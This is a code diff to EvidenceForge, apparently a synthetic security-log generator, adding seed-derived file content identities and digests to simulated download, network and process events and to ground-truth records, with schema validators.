@@ -1,0 +1,1310 @@
+diff --git a/src/evidenceforge/events/__init__.py b/src/evidenceforge/events/__init__.py
+index bd630f2..ce73922 100644
+--- a/src/evidenceforge/events/__init__.py
++++ b/src/evidenceforge/events/__init__.py
+@@ -31,6 +31,7 @@ from evidenceforge.events.authentication import (
+     RemoteAuthenticationTransportPlan,
+ )
+ from evidenceforge.events.base import RawLogEntry, SecurityEvent
++from evidenceforge.events.content import FileContentIdentity, FileContentRegistry, FileDigestSet
+ from evidenceforge.events.contexts import (
+     AuthContext,
+     DnsContext,
+@@ -53,6 +54,9 @@ from evidenceforge.events.contexts import (
+ __all__ = [
+     "SecurityEvent",
+     "RawLogEntry",
++    "FileDigestSet",
++    "FileContentIdentity",
++    "FileContentRegistry",
+     "RemoteAuthenticationPlan",
+     "RemoteAuthenticationTransportPlan",
+     "HostContext",
+diff --git a/src/evidenceforge/events/content.py b/src/evidenceforge/events/content.py
+new file mode 100644
+index 0000000..81ffc1b
+--- /dev/null
++++ b/src/evidenceforge/events/content.py
+@@ -0,0 +1,110 @@
++# Copyright (c) 2026 Peter Hanily
++#
++# Permission is hereby granted, free of charge, to any person obtaining a copy
++# of this software and associated documentation files (the "Software"), to deal
++# in the Software without restriction, including without limitation the rights
++# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
++# copies of the Software, and to permit persons to whom the Software is
++# furnished to do so, subject to the following conditions:
++#
++# The above copyright notice and this permission notice shall be included in
++# all copies or substantial portions of the Software.
++#
++# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
++# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
++# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
++# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
++# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
++# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
++# SOFTWARE.
++#
++# SPDX-License-Identifier: MIT
++
++"""Canonical synthetic content identity shared across distinct events.
++
++This module deliberately does not claim to materialize file bytes. A scenario's
++role-specific content reference names one logical object, and its digests are
++derived from a domain-separated synthetic seed. The immutable result can be
++reused by transfer and execution occurrences until a future content store can
++replace the seed-derived construction with digests of materialized bytes.
++"""
++
++from __future__ import annotations
++
++import hashlib
++import re
++from collections.abc import Collection
++from dataclasses import dataclass
++from typing import Literal
++
++_CONTENT_REF = re.compile(r"[A-Za-z0-9][A-Za-z0-9._:-]{0,127}")
++
++
++@dataclass(frozen=True, slots=True)
++class FileDigestSet:
++    """Standard whole-file digests; deliberately excludes PE import identity."""
++
++    md5: str
++    sha1: str
++    sha256: str
++
++    def hashes_for(self, analyzers: list[str]) -> dict[str, str]:
++        """Return only standard digest fields for analyzers that actually ran."""
++
++        requested = {analyzer.upper() for analyzer in analyzers}
++        return {
++            algorithm: getattr(self, algorithm)
++            for algorithm in ("md5", "sha1", "sha256")
++            if algorithm.upper() in requested
++        }
++
++
++@dataclass(frozen=True, slots=True)
++class FileContentIdentity:
++    """Immutable scenario-scoped identity for one logical file's content."""
++
++    identity_id: str
++    reference: str
++    digests: FileDigestSet
++    provenance: Literal["synthetic_v1", "materialized_bytes"]
++    derivation_version: int = 1
++
++    @classmethod
++    def synthetic(cls, scenario_name: str, reference: str) -> FileContentIdentity:
++        """Build a domain-separated identity scoped to one scenario and reference."""
++
++        if _CONTENT_REF.fullmatch(reference) is None:
++            raise ValueError(
++                "content_ref must be 1-128 characters and contain only letters, digits, "
++                "dot, underscore, colon, or dash"
++            )
++        seed = f"evidenceforge:file-content:v1:{scenario_name}:{reference}".encode()
++        return cls(
++            identity_id=f"{scenario_name}:{reference}",
++            reference=reference,
++            digests=FileDigestSet(
++                md5=hashlib.md5(seed, usedforsecurity=False).hexdigest(),
++                sha1=hashlib.sha1(seed, usedforsecurity=False).hexdigest(),
++                sha256=hashlib.sha256(seed, usedforsecurity=False).hexdigest(),
++            ),
++            provenance="synthetic_v1",
++        )
++
++
++class FileContentRegistry:
++    """Scenario-owned resolver that constructs each declared identity once."""
++
++    def __init__(self, scenario_name: str, references: Collection[str]) -> None:
++        self.scenario_name = scenario_name
++        self._identities = {
++            reference: FileContentIdentity.synthetic(scenario_name, reference)
++            for reference in references
++        }
++
++    def resolve(self, reference: str) -> FileContentIdentity:
++        """Resolve a declared reference or fail rather than inventing an identity."""
++
++        try:
++            return self._identities[reference]
++        except KeyError as exc:
++            raise ValueError(f"unknown file content reference: {reference}") from exc
+diff --git a/src/evidenceforge/events/contexts.py b/src/evidenceforge/events/contexts.py
+index 8aa9377..4545fab 100644
+--- a/src/evidenceforge/events/contexts.py
++++ b/src/evidenceforge/events/contexts.py
+@@ -33,6 +33,7 @@ from dataclasses import dataclass, field
+ from datetime import datetime
+ from typing import Any
+
++from evidenceforge.events.content import FileContentIdentity
+ from evidenceforge.events.identity import EventIdentityPlan
+ from evidenceforge.events.network import (
+     DirectionalTrafficLedger,
+@@ -122,6 +123,7 @@ class ProcessContext:
+     current_directory: str = ""  # Sysmon Event 1 CurrentDirectory / process working dir
+     concurrency_group_id: str = ""  # Explicit same-shell concurrency group (for pipelines)
+     target_security_context: ProcessTargetSecurityContext | None = None
++    image_content_identity: FileContentIdentity | None = None
+
+
+ @dataclass(slots=True)
+@@ -592,6 +594,20 @@ class FileTransferContext:
+     md5: str = ""
+     sha1: str = ""
+     sha256: str = ""
++    content_identity: FileContentIdentity | None = None
++
++    def __post_init__(self) -> None:
++        """Reject observed standard digests that conflict with explicit world truth."""
++
++        if self.content_identity is None:
++            return
++        for algorithm in ("md5", "sha1", "sha256"):
++            observed = getattr(self, algorithm)
++            expected = getattr(self.content_identity.digests, algorithm)
++            if observed and observed.lower() != expected.lower():
++                raise ValueError(
++                    f"FileTransferContext {algorithm} conflicts with content_identity"
++                )
+
+
+ @dataclass(slots=True)
+diff --git a/src/evidenceforge/events/ground_truth.py b/src/evidenceforge/events/ground_truth.py
+index 0be7e87..3704170 100644
+--- a/src/evidenceforge/events/ground_truth.py
++++ b/src/evidenceforge/events/ground_truth.py
+@@ -35,6 +35,18 @@ class GroundTruthAttributesBase(BaseModel):
+     base_domain: str | None = None
+     bytes_exfiltrated: int | None = None
+     command_line: str | None = None
++    response_content_ref: str | None = None
++    response_content_identity_version: int | None = None
++    response_content_identity_provenance: Literal[
++        "synthetic_v1", "materialized_bytes"
++    ] | None = None
++    response_content_identity_digests: dict[str, str] | None = None
++    image_content_ref: str | None = None
++    image_content_identity_version: int | None = None
++    image_content_identity_provenance: Literal[
++        "synthetic_v1", "materialized_bytes"
++    ] | None = None
++    image_content_identity_digests: dict[str, str] | None = None
+     count: int | None = None
+     domain_sample: list[str] | None = None
+     dst_ip: str | None = None
+diff --git a/src/evidenceforge/events/observation_manifest.py b/src/evidenceforge/events/observation_manifest.py
+index 9788e77..ce295e6 100644
+--- a/src/evidenceforge/events/observation_manifest.py
++++ b/src/evidenceforge/events/observation_manifest.py
+@@ -80,6 +80,14 @@ class ObservationManifest(BaseModel):
+     schema_version: int = 1
+     scenario_name: str
+     observation_profile: str
++    content_identity_model: Literal["synthetic_v1"] | None = Field(
++        default=None,
++        exclude_if=lambda value: value is None,
++    )
++    content_identity_version: int | None = Field(
++        default=None,
++        exclude_if=lambda value: value is None,
++    )
+     collection_window: dict[str, str | None]
+     source_summary: ObservationStatusCounts = Field(default_factory=dict)
+     storyline_events: list[ObservationManifestEvent] = Field(default_factory=list)
+@@ -98,8 +106,11 @@ def build_observation_manifest(
+ ) -> ObservationManifest:
+     """Build the observation manifest for a generated scenario."""
+     return ObservationManifest(
++        schema_version=2 if scenario.content_identities else 1,
+         scenario_name=scenario.name,
+         observation_profile=scenario.observation_profile,
++        content_identity_model=("synthetic_v1" if scenario.content_identities else None),
++        content_identity_version=(1 if scenario.content_identities else None),
+         collection_window=_collection_window(scenario),
+         source_summary=_source_summary(source_evidence_status),
+         storyline_events=[
+diff --git a/src/evidenceforge/generation/actions/file_transfer.py b/src/evidenceforge/generation/actions/file_transfer.py
+index b102dc0..e200335 100644
+--- a/src/evidenceforge/generation/actions/file_transfer.py
++++ b/src/evidenceforge/generation/actions/file_transfer.py
+@@ -33,6 +33,7 @@ from typing import Any, Protocol
+ from urllib.parse import urlsplit
+
+ from evidenceforge.events.base import SecurityEvent
++from evidenceforge.events.content import FileContentIdentity
+ from evidenceforge.events.contexts import (
+     AuthContext,
+     EdrContext,
+@@ -289,17 +290,23 @@ class HttpResponseFileTransferRequest:
+     response_mime_types: list[str]
+     timestamp: datetime
+     parent_duration: float | None = None
++    content_identity: FileContentIdentity | None = None
+     source: str = "activity_generator"
+
+     @property
+     def stable_id(self) -> str:
+         """Return a deterministic intent identifier for durable references."""
+
++        content_suffix = (
++            f":{self.content_identity.identity_id}:v{self.content_identity.derivation_version}"
++            if self.content_identity is not None
++            else ""
++        )
+         seed = _stable_seed(
+             "action_bundle:http_file_transfer:"
+             f"{self.host}:{self.uri}:{self.dst_ip}:{self.response_body_len}:"
+             f"{','.join(self.response_mime_types)}:{self.timestamp.isoformat()}:"
+-            f"{self.parent_duration or ''}:{self.source}"
++            f"{self.parent_duration or ''}{content_suffix}:{self.source}"
+         )
+         return f"http-file-transfer-{seed:016x}"
+
+@@ -351,7 +358,11 @@ class HttpResponseFileTransferActionBundle:
+             self._request.response_body_len,
+             file_mime_type,
+         )
+-        file_hashes = file_transfer_hashes(content_seed_material, analyzers)
++        file_hashes = (
++            self._request.content_identity.digests.hashes_for(analyzers)
++            if self._request.content_identity is not None
++            else file_transfer_hashes(content_seed_material, analyzers)
++        )
+         file_transfer = FileTransferContext(
+             fuid=fuid,
+             source="HTTP",
+@@ -370,6 +381,7 @@ class HttpResponseFileTransferActionBundle:
+             missing_bytes=missing_bytes,
+             overflow_bytes=0,
+             timedout=timedout,
++            content_identity=self._request.content_identity,
+             **file_hashes,
+         )
+         return HttpResponseFileTransferResult(
+diff --git a/src/evidenceforge/generation/actions/network_connection.py b/src/evidenceforge/generation/actions/network_connection.py
+index a18a87c..f1bf5af 100644
+--- a/src/evidenceforge/generation/actions/network_connection.py
++++ b/src/evidenceforge/generation/actions/network_connection.py
+@@ -28,6 +28,7 @@ from dataclasses import dataclass, field
+ from datetime import datetime
+ from typing import Protocol
+
++from evidenceforge.events.content import FileContentIdentity
+ from evidenceforge.events.contexts import (
+     DnsContext,
+     EmailContext,
+@@ -123,6 +124,7 @@ class NetworkConnectionRequest:
+     ssh_attempted_username: str | None = None
+     parent_action_group_id: str | None = None
+     preserve_start_time: bool = False
++    response_content_identity: FileContentIdentity | None = None
+     source: str = "activity_generator"
+
+     @property
+@@ -130,6 +132,12 @@ class NetworkConnectionRequest:
+         """Return a deterministic intent identifier for durable references."""
+
+         source_hostname = self.source_system.hostname if self.source_system is not None else ""
++        content_suffix = (
++            f":response:{self.response_content_identity.identity_id}:"
++            f"v{self.response_content_identity.derivation_version}"
++            if self.response_content_identity is not None
++            else ""
++        )
+         seed = _stable_seed(
+             "action_bundle:network_connection:"
+             f"{self.src_ip}:{self.dst_ip}:{self.time.isoformat()}:{self.dst_port}:"
+@@ -148,7 +156,8 @@ class NetworkConnectionRequest:
+             f"{self.suppress_source_pid_inference}:{self.preserve_explicit_payload}:"
+             f"{self.suppress_prereq_dns}:{self.packet_overhead_bytes or ''}:"
+             f"{self.responding_pid}:{self.ssh_attempted_username or ''}:"
+-            f"{self.parent_action_group_id or ''}:{self.preserve_start_time}:{self.source}"
++            f"{self.parent_action_group_id or ''}:{self.preserve_start_time}"
++            f"{content_suffix}:{self.source}"
+         )
+         return f"network-connection-{seed:016x}"
+
+diff --git a/src/evidenceforge/generation/actions/network_transaction_planner.py b/src/evidenceforge/generation/actions/network_transaction_planner.py
+index 2868f5b..d7d1ab2 100644
+--- a/src/evidenceforge/generation/actions/network_transaction_planner.py
++++ b/src/evidenceforge/generation/actions/network_transaction_planner.py
+@@ -231,6 +231,7 @@ class NetworkTransactionPlanner:
+         ssh_attempted_username = request.ssh_attempted_username
+         parent_action_group_id = request.parent_action_group_id
+         preserve_start_time = request.preserve_start_time
++        response_content_identity = request.response_content_identity
+         caller_supplied_pid = pid > 0
+
+         from evidenceforge.events.contexts import NetworkContext
+@@ -500,6 +501,11 @@ class NetworkTransactionPlanner:
+             )
+
+         explicit_proxy = will_route_explicit_proxy
++        if explicit_proxy and response_content_identity is not None:
++            raise ValueError(
++                "download content identity currently supports direct HTTP only; "
++                "explicit proxy routing is not yet supported"
++            )
+         if explicit_proxy:
+             proxy_request = ProxyTransactionRequest(
+                 src_ip=src_ip,
+@@ -2146,6 +2152,7 @@ class NetworkTransactionPlanner:
+                 dst_ip=dst_ip,
+                 rng=rng,
+                 probabilistic_file_analysis=not caller_supplied_http,
++                content_identity=response_content_identity,
+             )
+
+         if (
+diff --git a/src/evidenceforge/generation/actions/process_execution.py b/src/evidenceforge/generation/actions/process_execution.py
+index 5c853ce..a57276d 100644
+--- a/src/evidenceforge/generation/actions/process_execution.py
++++ b/src/evidenceforge/generation/actions/process_execution.py
+@@ -28,6 +28,7 @@ from dataclasses import dataclass
+ from datetime import datetime
+ from typing import Protocol
+
++from evidenceforge.events.content import FileContentIdentity
+ from evidenceforge.events.lifecycle import SessionEndPlan
+ from evidenceforge.generation.actions.base import ActionAnchor
+ from evidenceforge.models.scenario import System, User
+@@ -52,6 +53,7 @@ class ProcessExecutionRequest:
+     allow_browser_launch_spacing: bool = True
+     concurrency_group_id: str = ""
+     lifecycle_group_id: str = ""
++    image_content_identity: FileContentIdentity | None = None
+     source: str = "activity_generator"
+
+     @property
+@@ -60,13 +62,20 @@ class ProcessExecutionRequest:
+
+         concurrency_suffix = f":{self.concurrency_group_id}" if self.concurrency_group_id else ""
+         lifecycle_suffix = f":{self.lifecycle_group_id}" if self.lifecycle_group_id else ""
++        content_suffix = (
++            f":image:{self.image_content_identity.identity_id}:"
++            f"v{self.image_content_identity.derivation_version}"
++            if self.image_content_identity is not None
++            else ""
++        )
+         seed = _stable_seed(
+             "action_bundle:process_execution:"
+             f"{self.user.username}:{self.system.hostname}:{self.time.isoformat()}:"
+             f"{self.logon_id}:{self.process_name}:{self.command_line}:"
+             f"{self.parent_pid}:{self.ensure_file_event}:{self.from_storyline}:"
+             f"{self.suppress_command_file_effect}:{self.allow_existing_browser_reuse}:"
+-            f"{self.allow_browser_launch_spacing}{concurrency_suffix}{lifecycle_suffix}:"
++            f"{self.allow_browser_launch_spacing}{concurrency_suffix}{lifecycle_suffix}"
++            f"{content_suffix}:"
+             f"{self.source}"
+         )
+         return f"process-execution-{seed:016x}"
+diff --git a/src/evidenceforge/generation/activity/generator.py b/src/evidenceforge/generation/activity/generator.py
+index ae78367..b481bec 100644
+--- a/src/evidenceforge/generation/activity/generator.py
++++ b/src/evidenceforge/generation/activity/generator.py
+@@ -56,6 +56,7 @@ from evidenceforge.events.artifacts_manifest import (
+ )
+ from evidenceforge.events.authentication import RemoteAuthenticationPlan
+ from evidenceforge.events.base import SecurityEvent
++from evidenceforge.events.content import FileContentIdentity
+ from evidenceforge.events.contexts import (
+     AuthContext,
+     DnsContext,
+@@ -970,24 +971,35 @@ def _attach_http_response_file_transfer(
+     dst_ip: str,
+     rng: random.Random,
+     probabilistic_file_analysis: bool,
++    content_identity: FileContentIdentity | None = None,
+ ) -> None:
+     """Attach source-native Zeek files.log metadata for eligible HTTP responses."""
+
+     if event.network is None or event.http is None or event.file_transfer is not None:
+         return
+     if event.network.service != "http" or event.network.conn_state != "SF":
++        if content_identity is not None:
++            raise ValueError(
++                "explicit response content identity requires a successful HTTP connection"
++            )
+         return
+     http = event.http
+     method = (http.method or "GET").upper()
+-    if (
++    response_cannot_produce_file = (
+         method in {"CONNECT", "HEAD"}
+         or not (200 <= http.status_code < 300)
++        or http.status_code in {204, 205}
+         or http.response_body_len <= 100
+         or not http.resp_mime_types
+-    ):
++    )
++    if response_cannot_produce_file:
++        if content_identity is not None:
++            raise ValueError(
++                "explicit response content identity requires an observable HTTP response body"
++            )
+         return
+
+-    required = _http_response_requires_file_transfer(http)
++    required = content_identity is not None or _http_response_requires_file_transfer(http)
+     if probabilistic_file_analysis:
+         sampled = rng.random() < 0.3
+         should_attach = required or sampled
+@@ -1027,6 +1039,7 @@ def _attach_http_response_file_transfer(
+             response_mime_types=list(http.resp_mime_types),
+             timestamp=event.timestamp,
+             parent_duration=event.network.duration,
++            content_identity=content_identity,
+         ),
+         rng,
+     ).execute()
+@@ -10843,6 +10856,7 @@ class ActivityGenerator:
+         allow_browser_launch_spacing: bool = True,
+         concurrency_group_id: str = "",
+         lifecycle_group_id: str = "",
++        image_content_identity: FileContentIdentity | None = None,
+     ) -> int:
+         """Generate process creation event across all applicable log formats.
+
+@@ -10890,6 +10904,7 @@ class ActivityGenerator:
+             allow_browser_launch_spacing=allow_browser_launch_spacing,
+             concurrency_group_id=concurrency_group_id,
+             lifecycle_group_id=lifecycle_group_id,
++            image_content_identity=image_content_identity,
+         )
+         return ProcessExecutionActionBundle(self, request).execute()
+
+@@ -10910,6 +10925,7 @@ class ActivityGenerator:
+         allow_existing_browser_reuse = request.allow_existing_browser_reuse
+         allow_browser_launch_spacing = request.allow_browser_launch_spacing
+         concurrency_group_id = request.concurrency_group_id
++        image_content_identity = request.image_content_identity
+
+         self.state_manager.set_current_time(time)
+         session_end_plan = self.state_manager.get_session_end_plan(logon_id)
+@@ -11271,6 +11287,7 @@ class ActivityGenerator:
+                     logon_type=process_logon_type,
+                 ),
+                 concurrency_group_id=concurrency_group_id,
++                image_content_identity=image_content_identity,
+             ),
+             edr=EdrContext(object_id=proc_obj_id, actor_id=parent_obj_id),
+             storyline_origin=from_storyline,
+@@ -12773,6 +12790,7 @@ class ActivityGenerator:
+         ssh_attempted_username: str | None = None,
+         parent_action_group_id: str | None = None,
+         preserve_start_time: bool = False,
++        response_content_identity: FileContentIdentity | None = None,
+     ) -> str:
+         """Generate network connection across all applicable log formats.
+
+@@ -12852,6 +12870,7 @@ class ActivityGenerator:
+             ssh_attempted_username=ssh_attempted_username,
+             parent_action_group_id=parent_action_group_id,
+             preserve_start_time=preserve_start_time,
++            response_content_identity=response_content_identity,
+         )
+         return NetworkConnectionActionBundle(
+             executor=self,
+diff --git a/src/evidenceforge/generation/emitters/sysmon.py b/src/evidenceforge/generation/emitters/sysmon.py
+index b4496ac..4c05ea8 100644
+--- a/src/evidenceforge/generation/emitters/sysmon.py
++++ b/src/evidenceforge/generation/emitters/sysmon.py
+@@ -910,6 +910,26 @@ class SysmonEventEmitter(LogEmitter):
+         imphash = hashlib.md5(f"imp:{seed}".encode(), usedforsecurity=False).hexdigest().upper()
+         return f"SHA1={sha1},MD5={md5},SHA256={sha256},IMPHASH={imphash}"
+
++    @classmethod
++    def _process_hashes_for_event(
++        cls,
++        event: SecurityEvent,
++        image: str,
++        host: Any | str | None = None,
++    ) -> str:
++        """Project explicit process-image digests while preserving legacy IMPHASH."""
++
++        legacy_hashes = cls._generate_hashes(image, host)
++        identity = event.process.image_content_identity if event.process is not None else None
++        if identity is None:
++            return legacy_hashes
++        imphash = legacy_hashes.rsplit("IMPHASH=", 1)[-1]
++        digests = identity.digests
++        return (
++            f"SHA1={digests.sha1.upper()},MD5={digests.md5.upper()},"
++            f"SHA256={digests.sha256.upper()},IMPHASH={imphash}"
++        )
++
+     @staticmethod
+     def _generate_logon_guid(hostname: str, logon_id: str) -> str:
+         """Generate one stable Sysmon LogonGuid per host/logon session."""
+@@ -997,7 +1017,7 @@ class SysmonEventEmitter(LogEmitter):
+             "LogonId": logon_id,
+             "TerminalSessionId": self._terminal_session_id(host.hostname, auth, logon_id),
+             "IntegrityLevel": integrity,
+-            "Hashes": self._generate_hashes(proc.image, host),
++            "Hashes": self._process_hashes_for_event(event, proc.image, host),
+             "ParentProcessGuid": parent_guid,
+             "ParentProcessId": proc.parent_pid,
+             "ParentImage": proc.parent_image or "-",
+diff --git a/src/evidenceforge/generation/engine/storyline.py b/src/evidenceforge/generation/engine/storyline.py
+index 1eb0689..809b935 100644
+--- a/src/evidenceforge/generation/engine/storyline.py
++++ b/src/evidenceforge/generation/engine/storyline.py
+@@ -45,6 +45,7 @@ from datetime import UTC, datetime, timedelta
+ from types import SimpleNamespace
+ from typing import Any
+
++from evidenceforge.events.content import FileContentIdentity, FileContentRegistry
+ from evidenceforge.events.lifecycle import SessionEndPlan
+ from evidenceforge.generation.actions import (
+     IdsAlertActionBundle,
+@@ -1273,6 +1274,48 @@ def _extract_sc_create_service_start_type(command_line: str) -> tuple[str, str]
+ class StorylineMixin:
+     """Mixin providing storyline event scheduling and execution methods."""
+
++    def _content_identities_for_spec(
++        self,
++        spec: Any,
++    ) -> tuple[FileContentIdentity | None, FileContentIdentity | None]:
++        """Resolve declared response and process-image identities through one registry."""
++
++        # Read declared fields rather than arbitrary attributes. Some internal
++        # tests and integrations pass Mock-like specs whose missing attributes
++        # manufacture sentinel values instead of returning None.
++        spec_fields = vars(spec)
++        response_ref = spec_fields.get("response_content_ref")
++        image_ref = spec_fields.get("image_content_ref")
++        if response_ref is None and image_ref is None:
++            return None, None
++        if not hasattr(self, "_file_content_registry"):
++            self._file_content_registry = FileContentRegistry(
++                self.scenario.name,
++                self.scenario.content_identities.keys(),
++            )
++        return (
++            self._file_content_registry.resolve(response_ref) if response_ref is not None else None,
++            self._file_content_registry.resolve(image_ref) if image_ref is not None else None,
++        )
++
++    @staticmethod
++    def _record_content_identity_ground_truth(
++        event: dict[str, Any],
++        identity: FileContentIdentity,
++        reference_field: str,
++    ) -> None:
++        """Serialize role, version, provenance, and expected standard digests."""
++
++        event[reference_field] = identity.reference
++        role_prefix = reference_field.removesuffix("_ref")
++        event[f"{role_prefix}_identity_version"] = identity.derivation_version
++        event[f"{role_prefix}_identity_provenance"] = identity.provenance
++        event[f"{role_prefix}_identity_digests"] = {
++            "md5": identity.digests.md5,
++            "sha1": identity.digests.sha1,
++            "sha256": identity.digests.sha256,
++        }
++
+     def _resolve_scenario_network_host(self, host: str, *, src_host: str = "") -> str | None:
+         """Resolve a scenario-authored host through network identities first."""
+
+@@ -3082,6 +3125,9 @@ class StorylineMixin:
+             malicious_event.update(result)
+
+         elif spec.type == "process":
++            response_content_identity, image_content_identity = (
++                self._content_identities_for_spec(spec)
++            )
+             os_category = _get_os_category(system.os)
+             if hasattr(self, "world_planner"):
+                 # Built-in/service accounts (SYSTEM, LOCAL SERVICE, etc.) run
+@@ -3218,6 +3264,12 @@ class StorylineMixin:
+                     process_command_line = shell_command_line
+
+             output_file = self._extract_output_file(command_line, os_category)
++            if (
++                response_content_identity is not None and output_file is None
++            ):
++                raise ValueError(
++                    "response_content_ref requires a command_line with an explicit output path"
++                )
+             process_logon_id = logon_id
+             explicit_parent = self._storyline_process_ref_for_parent(
+                 actor=process_actor,
+@@ -3292,6 +3344,7 @@ class StorylineMixin:
+                 ensure_file_event=not service_backed_process,
+                 from_storyline=True,
+                 suppress_command_file_effect=output_file is not None,
++                image_content_identity=image_content_identity,
+             )
+             self.activity_generator._record_user_process(system, process_actor, pid, process_name)
+             self._record_last_storyline_process(system, pid, process_name)
+@@ -3307,6 +3360,18 @@ class StorylineMixin:
+             malicious_event["process_name"] = process_name
+             malicious_event["command_line"] = command_line
+             malicious_event["pid"] = pid
++            if response_content_identity is not None:
++                self._record_content_identity_ground_truth(
++                    malicious_event,
++                    response_content_identity,
++                    "response_content_ref",
++                )
++            if image_content_identity is not None:
++                self._record_content_identity_ground_truth(
++                    malicious_event,
++                    image_content_identity,
++                    "image_content_ref",
++                )
+             archive_destination = self._extract_compress_archive_destination(command_line)
+             if archive_destination:
+                 staging_source_ip = self._last_storyline_logon_source_for_actor_system(
+@@ -3383,6 +3448,19 @@ class StorylineMixin:
+                 malicious_event["output_file"] = output_file
+
+             http_url = self._extract_http_url(command_line)
++            if (
++                response_content_identity is not None and http_url is None
++            ):
++                raise ValueError("response_content_ref requires one HTTP URL")
++            if (
++                response_content_identity is not None
++                and http_url is not None
++                and not http_url.lower().startswith("http://")
++            ):
++                raise ValueError(
++                    "download content identity currently requires plaintext HTTP so "
++                    "Zeek files.log can observe the transferred object"
++                )
+             if http_url is not None:
+                 parsed_target = self._parse_http_url_target(http_url)
+                 if parsed_target is not None:
+@@ -3466,6 +3544,7 @@ class StorylineMixin:
+                             resp_mime_types=[mime_type],
+                             tags=[],
+                         ),
++                        response_content_identity=response_content_identity,
+                     )
+                     malicious_event["network_url"] = http_url
+
+@@ -3737,6 +3816,7 @@ class StorylineMixin:
+                     self._storyline_shell_available_at[process_shell_key] = shell_release_time
+
+         elif spec.type == "connection":
++            response_content_identity, _ = self._content_identities_for_spec(spec)
+             source_ip = spec.source_ip or system.ip
+             dst_ip = spec.dst_ip
+             effective_dst_ip = dst_ip
+@@ -3921,6 +4001,7 @@ class StorylineMixin:
+                 preserve_explicit_payload=(
+                     spec.orig_bytes is not None or spec.resp_bytes is not None
+                 ),
++                response_content_identity=response_content_identity,
+             )
+             logged_dst_ip = getattr(
+                 self.activity_generator,
+@@ -3930,6 +4011,12 @@ class StorylineMixin:
+             malicious_event["dst_ip"] = logged_dst_ip
+             malicious_event["dst_port"] = dst_port
+             malicious_event["uid"] = _ground_truth_uid(uid, source_ip, logged_dst_ip)
++            if response_content_identity is not None:
++                self._record_content_identity_ground_truth(
++                    malicious_event,
++                    response_content_identity,
++                    "response_content_ref",
++                )
+
+             # Causal expansion: SMB to file server emits type 3 logon pair
+             if dst_port == 445:
+diff --git a/src/evidenceforge/generation/ground_truth.py b/src/evidenceforge/generation/ground_truth.py
+index c637032..adfcbe5 100644
+--- a/src/evidenceforge/generation/ground_truth.py
++++ b/src/evidenceforge/generation/ground_truth.py
+@@ -106,7 +106,9 @@ class GroundTruthGenerator:
+         generated_at = generated_at.replace(microsecond=0)
+         document = GroundTruthDocument.model_validate(
+             {
+-                "schema_version": GROUND_TRUTH_SCHEMA_VERSION,
++                "schema_version": (
++                    2 if self.scenario.content_identities else GROUND_TRUTH_SCHEMA_VERSION
++                ),
+                 "scenario_name": self.scenario.name,
+                 "scenario_description": self.scenario.description,
+                 "generated_at": generated_at,
+diff --git a/src/evidenceforge/models/scenario.py b/src/evidenceforge/models/scenario.py
+index 6fe8772..05b150e 100644
+--- a/src/evidenceforge/models/scenario.py
++++ b/src/evidenceforge/models/scenario.py
+@@ -759,6 +759,24 @@ class ProcessEventSpec(_EventSpecBase):
+     process_ref: str | None = None  # Optional durable ref for explicit parent/child lineage
+     parent_ref: str | None = None  # Optional process_ref to use as this process parent
+     supplementary: Literal["auto", "none"] = "auto"
++    response_content_ref: str | None = Field(
++        default=None,
++        pattern=r"^[A-Za-z0-9][A-Za-z0-9._:-]{0,127}$",
++        description="Declared file content carried by this process command's HTTP response",
++    )
++    image_content_ref: str | None = Field(
++        default=None,
++        pattern=r"^[A-Za-z0-9][A-Za-z0-9._:-]{0,127}$",
++        description="Declared file content used as this process image",
++    )
++
++    @model_validator(mode="after")
++    def validate_content_identity_role(self) -> "ProcessEventSpec":
++        """Require response-body identity to have an explicit download command."""
++
++        if self.response_content_ref is not None and not self.command_line:
++            raise ValueError("response_content_ref requires an explicit command_line")
++        return self
+
+
+ class LogonEventSpec(_EventSpecBase):
+@@ -810,6 +828,11 @@ class ConnectionEventSpec(_EventSpecBase):
+     orig_bytes: int | None = None  # Originator payload bytes (large for exfil)
+     resp_bytes: int | None = None  # Responder payload bytes (large for downloads)
+     conn_state: str | None = None  # Connection outcome (default: SF for storyline)
++    response_content_ref: str | None = Field(
++        default=None,
++        pattern=r"^[A-Za-z0-9][A-Za-z0-9._:-]{0,127}$",
++        description="Declared file content carried by this HTTP response",
++    )
+
+     @field_validator("hostname")
+     @classmethod
+@@ -819,6 +842,25 @@ class ConnectionEventSpec(_EventSpecBase):
+             _validate_hostname(v, "connection.hostname")
+         return v
+
++    @model_validator(mode="after")
++    def validate_response_content_role(self) -> "ConnectionEventSpec":
++        """Restrict explicit response identities to response-bearing HTTP events."""
++
++        if self.response_content_ref is not None:
++            if self.service != "http" or not self.uri:
++                raise ValueError("response_content_ref requires service=http and an explicit uri")
++            if (self.method or "GET").upper() in {"CONNECT", "HEAD"}:
++                raise ValueError("response_content_ref requires a response-body HTTP method")
++            if self.status_code is not None and not 200 <= self.status_code < 300:
++                raise ValueError("response_content_ref requires a successful HTTP status_code")
++            if self.status_code in {204, 205}:
++                raise ValueError("response_content_ref requires an HTTP status with a body")
++            if self.response_body_len is not None and self.response_body_len <= 100:
++                raise ValueError("response_content_ref requires response_body_len greater than 100")
++            if self.conn_state is not None and self.conn_state != "SF":
++                raise ValueError("response_content_ref requires conn_state=SF")
++        return self
++
+
+ class SshSessionEventSpec(_EventSpecBase):
+     """SSH session event (generates Zeek conn + syslog sshd + eCAR)."""
+@@ -2417,6 +2459,14 @@ class OutputSpec(BaseModel):
+     compression: bool = Field(default=False)
+
+
++class FileContentDeclaration(BaseModel):
++    """Explicit scenario declaration for one synthetic logical file."""
++
++    kind: Literal["synthetic_file"] = "synthetic_file"
++
++    model_config = ConfigDict(extra="forbid")
++
++
+ class Scenario(BaseModel):
+     """Main scenario definition (simplified for Phase 1).
+
+@@ -2444,6 +2494,7 @@ class Scenario(BaseModel):
+     version: str = Field(default="1.0")
+     name: str = Field(..., pattern="^[a-zA-Z0-9_-]+$")
+     description: str
++    content_identities: dict[str, FileContentDeclaration] = Field(default_factory=dict)
+     environment: Environment
+     personas: list[Persona] | None = Field(default_factory=list)
